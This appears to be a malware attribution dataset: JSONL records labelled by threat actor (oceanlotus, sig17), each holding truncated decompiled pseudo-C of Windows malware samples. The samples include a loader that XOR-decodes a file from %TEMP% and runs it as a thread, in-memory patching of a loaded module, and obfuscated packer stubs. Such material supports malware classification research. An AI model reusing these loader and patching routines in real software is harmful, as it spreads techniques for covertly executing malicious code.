unsigned int a2@<edx>, _DWORD *a3@<ecx>, unsigned int a4@<ebx>, int a5)\n{\n  unsigned int v5; // kr00_4\n  unsigned __int16 v7; // dx\n  unsigned __int32 v8; // et0\n  char v11[4]; // [esp+20h] [ebp-4h] BYREF\n\n  if ( *a3 )\n  {\n    v5 = __readeflags();\n    --BYTE1(a4);\n    v8 = _byteswap_ulong(a2);\n  "}
{"author": "oceanlotus", "label": 1, "inputs": "void __usercall sub_401000(char a1@<zf>, _DWORD *a2@<esi>, int a3)\n{\n  int v3; // [esp-18h] [ebp-1Ch]\n  int v4; // [esp-14h] [ebp-18h]\n  int v5; // [esp-10h] [ebp-14h]\n  int v6; // [esp-Ch] [ebp-10h]\n  int v7; // [esp-8h] [ebp-Ch]\n  __TI_flags *v8; // [esp-4h] [ebp-8h]\n  int v9; // [esp+0h] [ebp-4h]\n\n  v8 = &_TI1_AVCAtlException_ATL__;\n  v7 = (int)&a3;\n  if ( !a1 && a1 )\n  {\n    v6 = 10267040;\n    v5 = 14813524;\n    v4 = 10200756;\n    v3 = 12450400;\n    __asm { jmp     ds:dword_411C40[ecx*4] }\n  }\n  if ( !a1 )\n  {\n    if ( a1 )\n    {\n      *a2 = 1769874460;\n      *((_BYTE *)&v9 - 26) = 34;\n      v7 = 11143164;\n      MEMORY[0x106C30C] = MEMORY[0xD07CD0];\n      v6 = 10576544;\n    }\n  }\n  sub_44C9B7(v6, v7);\n  __debugbreak();\n}\nvoid sub_401C10()\n{\n  JUMPOUT(0x4021ED);\n}\nvoid nullsub_18()\n{\n  ;\n}\n// bad sp value at call has been detected, the output may be wrong!\nint __userpurge sub_404400@<eax>(char a1@<zf>, __int16 a2@<ax>, int *a3@<ecx>, int a4@<ebx>, int a5@<edi>, int a6@<esi>, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int a23, int a24, int a25, int a26, int a27, int a28, int a29, int a30, int a31, int a32, int a33, int a34, int a35, int a36, int a37, int a38, int a39, int a40, int a41, int a42, int a43, int a44, int a45, int a46, int a47, int a48, int a49, int a50, int a51, int a52, int a53, int a54, int a55, int a56, int a57, int a58, int a59, int a60, int a61, int a62, int a63)\n{\n  bool v66; // zf\n  int v67; // eax\n  _BYTE *v68; // edi\n  bool v71; // cf\n  int *v74; // ecx\n  _DWORD *v75; // eax\n  int v76; // edi\n  int v77; // eax\n  int v78; // eax\n  int v79; // edx\n  int v80; // ecx\n  _DWORD v81[2]; // [esp-28h] [ebp-2Ch] BYREF\n  int v82; // [esp-20h] [ebp-24h]\n  int v83; // [esp-1Ch] [ebp-20h]\n  int v84; // [esp-18h] [ebp-1Ch]\n  int v85; // [esp-14h] [ebp-18h]\n  int v86; // [esp-10h] [ebp-14h]\n  int v87; // [esp-Ch] [ebp-10h]\n  int v88; // [esp-8h] [ebp-Ch]\n  int v89; // [esp-4h] [ebp-8h]\n  _BYTE v90[4]; // [esp+"}
{"author": "oceanlotus", "label": 1, "inputs": "BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)\n{\n  return 1;\n}\nSIZE_T ls()\n{\n  SIZE_T result; // eax\n  WCHAR *v1; // esi\n  DWORD v2; // esi\n  char *v3; // edi\n  DWORD v4; // eax\n  void *v5; // edi\n  HANDLE hFile; // [esp+8h] [ebp-Ch]\n  DWORD NumberOfBytesRead; // [esp+Ch] [ebp-8h] BYREF\n\n  result = (SIZE_T)VirtualAlloc(0, 0x4000u, 0x3000u, 4u);\n  v1 = (WCHAR *)result;\n  if ( result )\n  {\n    result = ExpandEnvironmentStringsW(L\"%TEMP%\", (LPWSTR)result, 0x4000u);\n    if ( result || (result = ExpandEnvironmentStringsW(L\"%TMP%\", v1, 0x4000u)) != 0 )\n    {\n      *(_DWORD *)&v1[result - 1] = 7143516;\n      *(_DWORD *)&v1[result + 1] = 7602277;\n      *(_DWORD *)&v1[result + 3] = 6881377;\n      *(_DWORD *)&v1[result + 5] = 6750317;\n      *(_DWORD *)&v1[result + 7] = 3014705;\n      *(_DWORD *)&v1[result + 9] = 7143543;\n      *(_DWORD *)&v1[result + 11] = 102;\n      result = (SIZE_T)CreateFileW(v1, 0x80000000, 0, 0, 3u, 0, 0);\n      hFile = (HANDLE)result;\n      if ( result != -1 )\n      {\n        result = GetFileSize((HANDLE)result, 0);\n        v2 = result;\n        if ( result != -1 )\n        {\n          v3 = (char *)VirtualAlloc(0, result, 0x3000u, 0x40u);\n          NumberOfBytesRead = 0;\n          result = ReadFile(hFile, v3, v2, &NumberOfBytesRead, 0);\n          if ( result )\n          {\n            v4 = 0;\n            if ( v2 )\n            {\n              if ( v2 >= 0x20 )\n              {\n                do\n                {\n                  *(__m128i *)&v3[v4] = _mm_xor_si128(*(__m128i *)&v3[v4], (__m128i)xmmword_1000C180);\n                  *(__m128i *)&v3[v4 + 16] = _mm_xor_si128((__m128i)xmmword_1000C180, *(__m128i *)&v3[v4 + 16]);\n                  v4 += 32;\n                }\n                while ( v4 < v2 - (v2 & 0x1F) );\n              }\n              for ( ; v4 < v2; ++v4 )\n                v3[v4] ^= 0xACu;\n            }\n            result = (SIZE_T)CreateThread(0, 0, (LPTHREAD_START_ROUTINE)v3, 0, 0, 0);\n            v5 = (void *)result;\n            if ( result != -1 )\n       "}
{"author": "oceanlotus", "label": 1, "inputs": "char sub_10001000()\n{\n  HMODULE v1; // eax\n  HMODULE v2; // esi\n  int v3; // edi\n  int v4; // ebx\n  _DWORD *v5; // edi\n  unsigned int v6; // ebx\n  int v7; // eax\n  _BYTE **v8; // ecx\n  _BYTE *v9; // eax\n  _BYTE **v10; // ecx\n  int v11; // eax\n  DWORD flOldProtect; // [esp+0h] [ebp-210h] BYREF\n  WCHAR Filename; // [esp+4h] [ebp-20Ch] BYREF\n  char v14[518]; // [esp+6h] [ebp-20Ah] BYREF\n\n  Filename = 0;\n  memset(v14, 0, sizeof(v14));\n  if ( !GetModuleFileNameW(0, &Filename, 0x104u) )\n    return 0;\n  v1 = GetModuleHandleW(&Filename);\n  v2 = v1;\n  if ( !v1 )\n    return 0;\n  v3 = *((_DWORD *)v1 + 15);\n  v4 = *(_DWORD *)((char *)v1 + v3 + 80);\n  v5 = (_DWORD *)((char *)v1 + v3);\n  flOldProtect = 0;\n  v6 = (unsigned int)v1 + v4;\n  if ( !VirtualProtect(v1, v5[20], 0x40u, &flOldProtect) )\n    return 0;\n  if ( v5[29] > 9u )\n  {\n    v7 = v5[48];\n    if ( v7 )\n    {\n      if ( v5[49] )\n      {\n        v8 = *(_BYTE ***)((char *)v2 + v7 + 12);\n        if ( v8 )\n        {\n          v9 = *v8;\n          if ( *v8 )\n          {\n            v10 = v8 + 1;\n            while ( v9 >= (_BYTE *)v2 && (unsigned int)(v9 + 5) < v6 )\n            {\n              *v9 = 51;\n              v9[1] = -64;\n              v9[2] = -62;\n              v9[3] = 12;\n              v9[4] = 0;\n              v9 = *v10++;\n              if ( !v9 )\n                goto LABEL_16;\n            }\n            return 0;\n          }\n        }\n      }\n    }\n  }\nLABEL_16:\n  v11 = v5[10];\n  if ( v11 )\n  {\n    if ( (unsigned int)v2 + v11 + 10 >= v6 )\n      return 0;\n    *((_BYTE *)v2 + v11) = -112;\n    *((_BYTE *)v2 + v11 + 1) = -112;\n    *((_BYTE *)v2 + v11 + 2) = -72;\n    *(_DWORD *)((char *)v2 + v11 + 3) = sub_10001210;\n    *((_BYTE *)v2 + v11 + 7) = -1;\n    *((_BYTE *)v2 + v11 + 8) = -32;\n    *((_BYTE *)v2 + v11 + 9) = -112;\n  }\n  return 1;\n}\nBOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)\n{\n  if ( fdwReason == 1 )\n  {\n    dword_10017804 = (int)hinstDLL;\n    if ( !sub_10001000() )\n      return 0;\n  }\n  sub_10001DF0(fdwReason);\n  return 1;\n}\nL"}
{"author": "oceanlotus", "label": 1, "inputs": "int __fastcall sub_401000(unsigned int a1)\n{\n  int v2; // esi\n  HMODULE v3; // eax\n  char *v4; // ecx\n  char *v5; // edx\n  int i; // eax\n  char *v7; // ebx\n  unsigned int v8; // edx\n  char *v10; // [esp+14h] [ebp-28h]\n  char *v11; // [esp+18h] [ebp-24h]\n  HMODULE v12; // [esp+20h] [ebp-1Ch]\n\n  v2 = -1;\n  v3 = GetModuleHandleW(0);\n  v12 = v3;\n  if ( v3 )\n  {\n    v4 = (char *)v3 + *((_DWORD *)v3 + 15);\n    v11 = v4;\n    if ( *(_DWORD *)v4 == 17744 )\n    {\n      v5 = v4 + 248;\n      v10 = v4 + 248;\n      for ( i = 0; i < *((unsigned __int16 *)v4 + 3); ++i )\n      {\n        v7 = &v5[40 * i];\n        v8 = (unsigned int)v12 + *((_DWORD *)v7 + 3);\n        if ( a1 < v8 + *((_DWORD *)v7 + 2) && a1 >= v8 )\n          return a1 + *((_DWORD *)v7 + 5) - v8;\n        v4 = v11;\n        v5 = v10;\n      }\n    }\n  }\n  return v2;\n}\nint sub_4010D0()\n{\n  int v0; // ebx\n  char v1; // dl\n  char v2; // cl\n  int *v3; // edx\n  int i; // edx\n  char v5; // al\n  char v6; // cl\n  char v7; // al\n  char v8; // cl\n  char v9; // al\n  char v10; // cl\n  int v11; // eax\n  int j; // esi\n  unsigned __int8 v13; // dl\n  unsigned __int8 v14; // al\n  int v15; // edx\n  int v16; // edx\n  int v17; // edx\n  int v18; // ecx\n  int v19; // edi\n  int v20; // ebx\n  int v21; // eax\n  int v22; // eax\n  int v23; // eax\n  int v24; // eax\n  int result; // eax\n  int v26; // [esp+10h] [ebp-208h]\n  char v27[255]; // [esp+14h] [ebp-204h]\n  char v28[257]; // [esp+113h] [ebp-105h]\n\n  v0 = 0;\n  v1 = 1;\n  do\n  {\n    v28[(unsigned __int8)v1 + 1] = v0;\n    v27[v0++] = v1;\n    v1 ^= (2 * v1) ^ (v1 < 0 ? 0x1B : 0);\n  }\n  while ( v0 < 256 );\n  v2 = 1;\n  v3 = &dword_473B60;\n  do\n  {\n    *v3++ = (unsigned __int8)v2 << 24;\n    v2 = (v2 < 0 ? 0x1B : 0) ^ (2 * v2);\n  }\n  while ( (int)v3 < (int)&unk_473B88 );\n  dword_4743A0[0] = 99;\n  dword_4714EC = 0;\n  for ( i = 1; i < 256; ++i )\n  {\n    v5 = v28[-(unsigned __int8)v28[i + 1]];\n    v6 = __ROL1__(v5, 1);\n    v7 = v6 ^ v5;\n    v8 = __ROL1__(v6, 1);\n    v9 = v8 ^ v7;\n    v10 = __ROL1__(v8, 1);\n    v11 = (unsigned __int8)(v10 ^ v9 ^ __ROL1__("}
{"author": "oceanlotus", "label": 1, "inputs": "wchar_t *__cdecl sub_402F70(int a1)\n{\n  return &aKernel32[160 * a1];\n}\nvoid nullsub_1()\n{\n  ;\n}\n// positive sp value has been detected, the output may be wrong!\nint __cdecl sub_403030(int a1)\n{\n  int result; // eax\n\n  result = a1;\n  dword_428E38 = a1;\n  return result;\n}\nint (__stdcall *__cdecl sub_403100(int a1))(_DWORD)\n{\n  int (__stdcall *result)(_DWORD); // eax\n  char v2; // zf\n\n  result = dword_428E38;\n  if ( dword_428E38 )\n  {\n    result = (int (__stdcall *)(_DWORD))dword_428E38(a1);\n    if ( !v2 )\n    {\n      if ( v2 )\n        result = (int (__stdcall *)(_DWORD))MEMORY[0x42C09C]();\n    }\n  }\n  return result;\n}\nchar __usercall sub_4031B0@<al>(char a1@<zf>, int a2@<edx>, int a3@<esi>, int a4)\n{\n  if ( !a1 && a1 )\n  {\n    MEMORY[0x112B908C] = a2;\n    MEMORY[0xF5500C] = a2;\n    *(_DWORD *)(a3 + 4) = 10539076;\n    a4 = MEMORY[0x1153B7DC];\n    LOBYTE(a4) = MEMORY[0x1153B7DC] + 1;\n  }\n  dword_428E3C = a4;\n  return a4;\n}\nvoid sub_403230()\n{\n  JUMPOUT(0x40351B);\n}\n// attributes: thunk\nint __cdecl sub_404040(int a1, int a2, char a3)\n{\n  return sub_40419C(a1, a2, a3);\n}\nbool __cdecl sub_40419C(int a1, int a2, unsigned __int8 a3)\n{\n  char v4; // zf\n  int v5; // eax\n  char v7[10]; // [esp+882h] [ebp-2Ch] BYREF\n  __int16 v8; // [esp+88Ch] [ebp-22h]\n  int v9; // [esp+89Ah] [ebp-14h] BYREF\n  int v10; // [esp+8A2h] [ebp-Ch]\n  int v11; // [esp+8A6h] [ebp-8h]\n\n  v10 = 1;\n  v11 = 0;\n  v5 = ((int (__thiscall *)(int, char *, int, int *, _DWORD, int))loc_403640)(a2, byte_403BD0, a1, &v9, a3, a2);\n  if ( !v4 && v4 )\n  {\n    v8 = 4128;\n    strcpy(v7, \"8bzi\u0152A\u0153\");\n    MEMORY[0x1153ADC0] = v5;\n    __debugbreak();\n    __debugbreak();\n    __debugbreak();\n    __debugbreak();\n    __debugbreak();\n    __debugbreak();\n    __debugbreak();\n    __debugbreak();\n    __debugbreak();\n    __debugbreak();\n    __debugbreak();\n    JUMPOUT(0x4043A0);\n  }\n  return v10 != 0;\n}\nint sub_407370()\n{\n  return dword_428E40();\n}\nBOOL sub_407440()\n{\n  int i; // esi\n  int j; // ecx\n  int v2; // edx\n  BOOL result; // eax\n  DWORD flOldProtect; // [esp+8h] [ebp-14h] "}
{"author": "oceanlotus", "label": 1, "inputs": "int sub_401000()\n{\n  return atexit(sub_426AE0);\n}\nint sub_40100C()\n{\n  return atexit(sub_426AEB);\n}\nint sub_401018()\n{\n  return atexit(sub_426AF6);\n}\nint sub_401024()\n{\n  return atexit(sub_426B01);\n}\nint sub_401030()\n{\n  int result; // eax\n\n  result = sub_4047AA() + 64;\n  dword_43735C = result;\n  return result;\n}\nunsigned int sub_40103E()\n{\n  unsigned int result; // eax\n\n  result = Concurrency::details::Security::InitializeCookie();\n  dword_437458 = result;\n  return result;\n}\nvoid sub_401049()\n{\n  dword_437450 = 0;\n}\nvoid sub_401054()\n{\n  dword_437448 = 0;\n}\nvoid sub_40105F()\n{\n  dword_437454 = 0;\n}\nvoid sub_40106A()\n{\n  dword_43744C = 0;\n}\nvoid sub_401075()\n{\n  InitializeSListHead(&ListHead);\n}\nint __cdecl sub_4010B0(int a1, int a2, int a3, int a4, int a5, int a6, unsigned int *a7)\n{\n  int v7; // ebx\n  unsigned int v8; // edi\n  int v9; // eax\n  int i; // esi\n  unsigned int v11; // ecx\n  int v12; // eax\n  const WCHAR *v13; // ecx\n  WCHAR *v14; // edx\n  unsigned int v15; // ebx\n  bool v16; // cf\n  int v17; // edx\n  WCHAR *v18; // eax\n  int v19; // ecx\n  INTERNET_PORT v20; // dx\n  DWORD v21; // edi\n  int v22; // eax\n  WCHAR *v23; // ecx\n  void (__stdcall *v24)(HINTERNET); // ebx\n  void *v25; // eax\n  void *v26; // esi\n  WCHAR *v27; // eax\n  WCHAR *v28; // ebx\n  unsigned int v29; // esi\n  unsigned int v30; // edi\n  DWORD v31; // ebx\n  void *v32; // esi\n  WCHAR *v33; // ebx\n  DWORD v34; // eax\n  int v35; // edx\n  DWORD v36; // ecx\n  void *v37; // esi\n  void *v38; // esi\n  DWORD v40; // [esp-10h] [ebp-24Ch]\n  WCHAR *v41; // [esp-Ch] [ebp-248h]\n  WCHAR *v42; // [esp-Ch] [ebp-248h]\n  WCHAR *v43; // [esp-Ch] [ebp-248h]\n  WCHAR *v44; // [esp-Ch] [ebp-248h]\n  DWORD dwNumberOfBytesRead; // [esp+4h] [ebp-238h] BYREF\n  int v46; // [esp+8h] [ebp-234h]\n  int v47; // [esp+Ch] [ebp-230h]\n  HINTERNET hInternet; // [esp+10h] [ebp-22Ch]\n  unsigned int *v49; // [esp+14h] [ebp-228h]\n  int v50; // [esp+18h] [ebp-224h]\n  DWORD dwNumberOfBytesAvailable; // [esp+1Ch] [ebp-220h] BYREF\n  LPCWSTR lpszObjectName; // [esp+20h] [ebp-21Ch]\n  voi"}
{"author": "oceanlotus", "label": 1, "inputs": "void *__thiscall sub_401000(void *Block, char a2)\n{\n  *(_DWORD *)Block = &std::error_category::`vftable';\n  if ( (a2 & 1) != 0 )\n    j__free(Block);\n  return Block;\n}\n_DWORD *__thiscall std::error_category::default_error_condition(void *this, _DWORD *a2, int a3)\n{\n  _DWORD *result; // eax\n\n  result = a2;\n  *a2 = a3;\n  a2[1] = this;\n  return result;\n}\nbool __thiscall sub_401050(void *this, int a2, _DWORD *a3)\n{\n  _DWORD *v3; // eax\n  char v5[8]; // [esp+0h] [ebp-8h] BYREF\n\n  v3 = (_DWORD *)(*(int (__thiscall **)(void *, char *, int))(*(_DWORD *)this + 12))(this, v5, a2);\n  return v3[1] == a3[1] && *v3 == *a3;\n}\nbool __thiscall sub_401090(void *this, _DWORD *a2, int a3)\n{\n  return this == (void *)a2[1] && *a2 == a3;\n}\nconst char *sub_4010B0()\n{\n  return \"generic\";\n}\nint __stdcall sub_4010C0(int a1, int a2)\n{\n  char *v2; // eax\n  char *v3; // edx\n\n  v2 = (char *)sub_404A2C(a2);\n  v3 = \"unknown error\";\n  if ( v2 )\n    v3 = v2;\n  *(_DWORD *)(a1 + 20) = 15;\n  *(_DWORD *)(a1 + 16) = 0;\n  *(_BYTE *)a1 = 0;\n  if ( *v3 )\n    sub_4035A0(a1, v3, strlen(v3));\n  else\n    sub_4035A0(a1, v3, 0);\n  return a1;\n}\nconst char *sub_401130()\n{\n  return \"iostream\";\n}\nint __stdcall sub_401140(int a1, int a2)\n{\n  if ( a2 == 1 )\n  {\n    *(_DWORD *)(a1 + 20) = 15;\n    *(_DWORD *)(a1 + 16) = 0;\n    *(_BYTE *)a1 = 0;\n    sub_4035A0(a1, \"iostream stream error\", 0x15u);\n  }\n  else\n  {\n    sub_4010C0(a1, a2);\n  }\n  return a1;\n}\nconst char *sub_401190()\n{\n  return \"system\";\n}\nint __stdcall sub_4011A0(int a1, int a2)\n{\n  char *v2; // eax\n  char *v3; // edx\n\n  v2 = (char *)sub_404A56(a2);\n  v3 = \"unknown error\";\n  if ( v2 )\n    v3 = v2;\n  *(_DWORD *)(a1 + 20) = 15;\n  *(_DWORD *)(a1 + 16) = 0;\n  *(_BYTE *)a1 = 0;\n  if ( *v3 )\n    sub_4035A0(a1, v3, strlen(v3));\n  else\n    sub_4035A0(a1, v3, 0);\n  return a1;\n}\n_DWORD *__stdcall sub_401210(_DWORD *a1, int a2)\n{\n  bool v2; // zf\n  _DWORD *result; // eax\n\n  v2 = sub_404A2C(a2) == 0;\n  result = a1;\n  *a1 = a2;\n  if ( v2 )\n    a1[1] = off_417FC0;\n  else\n    a1[1] = off_417FC4;\n  return result;\n}\nchar __th"}
{"author": "oceanlotus", "label": 1, "inputs": "// positive sp value has been detected, the output may be wrong!\nint __stdcall KbdLayerDescriptor(int a1, const CHAR *a2, int a3, int a4)\n{\n  if ( a2 )\n    SetCurrentDirectoryA(a2);\n  Sleep(0xFFFFFFFF);\n  return 1;\n}\nint __cdecl sub_10001220(int a1)\n{\n  return sub_100014B7();\n}\nvoid sub_100014B7()\n{\n  JUMPOUT(0x10001264);\n}\nint sub_100021B0()\n{\n  int savedregs; // [esp+0h] [ebp+0h]\n\n  savedregs = -2;\n  return sub_1000223F();\n}\nint sub_1000223F()\n{\n  return sub_10002455();\n}\nint sub_100022E3()\n{\n  return 1;\n}\nvoid __usercall sub_10002455(int a1@<ebp>, int a2@<edi>)\n{\n  uintptr_t v2; // eax\n  int v3; // [esp-8h] [ebp-10h] BYREF\n  int v4; // [esp-4h] [ebp-Ch]\n\n  v4 = a2;\n  v2 = __security_cookie;\n  *(_DWORD *)(a1 - 8) ^= __security_cookie;\n  v3 = a1 ^ v2;\n  *(_DWORD *)(a1 - 24) = &v3;\n  *(_DWORD *)(a1 - 32) = 0;\n  *(_DWORD *)(a1 - 28) = 0;\n  if ( (unsigned int)sub_1004D1B0(*(_DWORD *)(a1 + 8), v3, v4) > 1\n    && (unsigned int)sub_1004D1B0(*(_DWORD *)(a1 + 12), v3, v4) > 1 )\n  {\n    *(_DWORD *)(a1 - 4) = 0;\n    *(_DWORD *)(a1 - 28) = sub_10002720(*(_DWORD *)(a1 + 8));\n    *(_DWORD *)(a1 - 4) = -2;\n    JUMPOUT(0x10002653);\n  }\n  JUMPOUT(0x100026E6);\n}\nvoid __usercall sub_10002691(int a1@<ebp>)\n{\n  ((void (__cdecl *)(int *))sub_100277E0)(&dword_104C2028);\n  *(_DWORD *)(a1 - 4) = -2;\n  ((void (__cdecl *)(_DWORD))loc_10028A40)(*(_DWORD *)(a1 - 32));\n  JUMPOUT(0x100026E6);\n}\nvoid sub_100051CB()\n{\n  JUMPOUT(0x100031C5);\n}\nint __thiscall sub_10006240(void *this, int a2)\n{\n  return sub_10006360(this);\n}\nint __userpurge sub_10006E00@<eax>(char a1@<zf>, int a2@<ecx>, int a3, int a4, int a5, int a6)\n{\n  if ( !a1 && a1 )\n    __asm { jmp     dword ptr ds:11393934h[ecx*4] }\n  unknown_libname_2(&a5);\n  return ((int (__thiscall *)(int))loc_10011C30)(a6);\n}\n// attributes: thunk\nint __cdecl sub_10007030(int a1, int a2)\n{\n  return sub_1000728B(a1, a2);\n}\n// write access to const memory has been detected, the output may be wrong!\nint __usercall sub_1000728B@<eax>(char a1@<zf>, _DWORD *a2@<eax>, int a3@<ecx>, int a4@<ebx>)\n{\n  if ( a1 ||"}
{"author": "sig17", "label": 2, "inputs": "int __usercall start@<eax>(GLenum a1@<edi>)\n{\n  struct _TEB *v1; // esi\n  void (*v2)(void); // eax\n  int result; // eax\n  unsigned int v4; // [esp+2Ch] [ebp-124h]\n  int v5; // [esp+78h] [ebp-D8h]\n  void (*v6)(void); // [esp+100h] [ebp-50h]\n\n  SetWindowTextW(0, 0);\n  Beep(0, 0);\n  MoveWindow(0, 0, 0, 0, 0, 0);\n  GetVersion();\n  v1 = NtCurrentTeb();\n  v1->glDispatchTable[151] = (void *)1954239867;\n  v1->glDispatchTable[151] = (char *)v1->glDispatchTable[151] - 1950041463;\n  glEnableClientState(a1);\n  v6 = v2;\n  v4 = sub_402663(v2);\n  sub_4028B1(v4 >> 2, 1150908194, v6);\n  v6();\n  result = v5;\n  if ( v5 != -110 && !v5 )\n    result = 0;\n  return result;\n}\nint __stdcall sub_402663(_BYTE *a1)\n{\n  _BYTE *v1; // edi\n  __int16 *v2; // esi\n  __int16 v3; // ax\n  int v5; // [esp+20h] [ebp-Ch]\n\n  v5 = 515961;\n  v1 = a1;\n  v2 = (__int16 *)a1;\n  do\n  {\n    v3 = *v2++;\n    *v1++ = HIBYTE(v3) + v3;\n    --v5;\n  }\n  while ( v5 );\n  return 515961;\n}\nint __stdcall sub_4028B1(int a1, int a2, _DWORD *a3)\n{\n  while ( a1 )\n  {\n    --a1;\n    *a3 += a2;\n    *a3 -= 950002256;\n    *a3 += a2;\n    *a3++ ^= a2;\n  }\n  return -988974970;\n}\n// attributes: thunk\nBOOL __stdcall Beep(DWORD dwFreq, DWORD dwDuration)\n{\n  return __imp_Beep(dwFreq, dwDuration);\n}\n// attributes: thunk\nLPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)\n{\n  return __imp_VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);\n}\n// attributes: thunk\nDWORD __stdcall GetVersion()\n{\n  return __imp_GetVersion();\n}\n// attributes: thunk\nvoid __stdcall glEnableClientState(GLenum array)\n{\n  __imp_glEnableClientState(array);\n}\n// attributes: thunk\nBOOL __stdcall SetWindowTextW(HWND hWnd, LPCWSTR lpString)\n{\n  return __imp_SetWindowTextW(hWnd, lpString);\n}\n// attributes: thunk\nBOOL __stdcall MoveWindow(HWND hWnd, int X, int Y, int nWidth, int nHeight, BOOL bRepaint)\n{\n  return __imp_MoveWindow(hWnd, X, Y, nWidth, nHeight, bRepaint);\n}\n"}
{"author": "sig17", "label": 2, "inputs": "// positive sp value has been detected, the output may be wrong!\nvoid __usercall start(int a1@<eax>, int a2@<edx>, int a3@<ecx>, unsigned int a4@<ebp>)\n{\n  int *v4; // esi\n  int *v5; // edi\n  char v6; // al\n  bool v7; // cf\n  int v8; // ebx\n  int v9; // ebx\n  int v10; // ett\n  int i; // eax\n  bool v12; // cf\n  int v13; // ebx\n  int v14; // ebx\n  int v15; // ett\n  unsigned int v16; // eax\n  bool v17; // zf\n  int v18; // ebx\n  int v19; // ett\n  unsigned int v20; // eax\n  bool v21; // cf\n  int v22; // ebx\n  int v23; // ett\n  bool v24; // cf\n  int v25; // ebx\n  int v26; // ett\n  int v27; // ecx\n  int v28; // ecx\n  unsigned int v29; // eax\n  unsigned int v30; // eax\n  int v31; // eax\n  bool v32; // cf\n  int v33; // ebx\n  int v34; // ett\n  bool v35; // cf\n  int v36; // ebx\n  int v37; // ett\n  bool v38; // cf\n  int v39; // ebx\n  int v40; // ebx\n  int v41; // ett\n  bool v42; // zf\n  int v43; // ebx\n  int v44; // ett\n  unsigned int v45; // ecx\n  char *v46; // edx\n  char v47; // al\n  int v48; // eax\n  bool v49; // cc\n  int *v50; // esi\n  int *v51; // edi\n  int v52; // ecx\n  char v53; // al\n  unsigned __int8 v54; // al\n  int v55; // eax\n  int v56; // eax\n  char v57; // t0\n  unsigned __int8 v58; // bl\n  char *v59; // edi\n  int *v60; // ebx\n  int v61; // ebp\n  char v62; // al\n  char *v63; // ecx\n  unsigned __int8 v64; // al\n  int v65; // eax\n  _WORD *v66; // edi\n  int *j; // ebx\n  int v68; // eax\n  int v69; // eax\n  int v70; // eax\n  char v71; // tt\n  void (__cdecl *v72)(int *, int, int, int *); // ebp\n  int *v73; // edi\n  int v74[4]; // [esp+1Ch] [ebp-90h] BYREF\n  int v75; // [esp+2Ch] [ebp-80h] BYREF\n  int v76; // [esp+30h] [ebp-7Ch] BYREF\n  char *v77; // [esp+34h] [ebp-78h]\n  int *v78; // [esp+38h] [ebp-74h]\n  int v79; // [esp+3Ch] [ebp-70h]\n  int v80; // [esp+40h] [ebp-6Ch]\n  int v81; // [esp+44h] [ebp-68h]\n  int v82; // [esp+48h] [ebp-64h]\n  int *v83; // [esp+4Ch] [ebp-60h]\n  int v84; // [esp+50h] [ebp-5Ch]\n  int v85; // [esp+54h] [ebp-58h]\n  int v86; // [esp+58h] [ebp-54h]\n  int v87; // [esp+5Ch] [ebp-50h] BYREF\n\n  v83 "}
{"author": "sig17", "label": 2, "inputs": "// positive sp value has been detected, the output may be wrong!\nvoid __usercall start(int a1@<eax>, int a2@<edx>, int a3@<ecx>, unsigned int a4@<ebp>)\n{\n  int (*v4)(); // esi\n  char *v5; // edi\n  char v6; // al\n  bool v7; // cf\n  int v8; // ebx\n  int v9; // ebx\n  int v10; // ett\n  int i; // eax\n  bool v12; // cf\n  int v13; // ebx\n  int v14; // ebx\n  int v15; // ett\n  unsigned int v16; // eax\n  bool v17; // zf\n  int v18; // ebx\n  int v19; // ett\n  unsigned int v20; // eax\n  bool v21; // cf\n  int v22; // ebx\n  int v23; // ett\n  bool v24; // cf\n  int v25; // ebx\n  int v26; // ett\n  int v27; // ecx\n  int v28; // ecx\n  unsigned int v29; // eax\n  unsigned int v30; // eax\n  int v31; // eax\n  bool v32; // cf\n  int v33; // ebx\n  int v34; // ett\n  bool v35; // cf\n  int v36; // ebx\n  int v37; // ett\n  bool v38; // cf\n  int v39; // ebx\n  int v40; // ebx\n  int v41; // ett\n  bool v42; // zf\n  int v43; // ebx\n  int v44; // ett\n  unsigned int v45; // ecx\n  char *v46; // edx\n  char v47; // al\n  int v48; // eax\n  bool v49; // cc\n  int v50; // esi\n  char *v51; // edi\n  int v52; // ecx\n  char v53; // al\n  unsigned __int8 v54; // al\n  int v55; // eax\n  int v56; // eax\n  char v57; // t0\n  unsigned __int8 v58; // bl\n  char *v59; // edi\n  int *v60; // ebx\n  int v61; // ebp\n  char v62; // al\n  char *v63; // ecx\n  unsigned __int8 v64; // al\n  int v65; // eax\n  _WORD *v66; // edi\n  int *j; // ebx\n  int v68; // eax\n  int v69; // eax\n  int v70; // eax\n  char v71; // tt\n  void (__cdecl *v72)(int, int, int, int *); // ebp\n  int v73; // edi\n  int v74[4]; // [esp+1Ch] [ebp-90h] BYREF\n  int v75; // [esp+2Ch] [ebp-80h] BYREF\n  int v76; // [esp+30h] [ebp-7Ch] BYREF\n  char *v77; // [esp+34h] [ebp-78h]\n  char *v78; // [esp+38h] [ebp-74h]\n  int v79; // [esp+3Ch] [ebp-70h]\n  int v80; // [esp+40h] [ebp-6Ch]\n  int v81; // [esp+44h] [ebp-68h]\n  int v82; // [esp+48h] [ebp-64h]\n  int *v83; // [esp+4Ch] [ebp-60h]\n  int v84; // [esp+50h] [ebp-5Ch]\n  int v85; // [esp+54h] [ebp-58h]\n  int v86; // [esp+58h] [ebp-54h]\n  int v87; // [esp+5Ch] [ebp-50h] BYREF\n\n  v"}
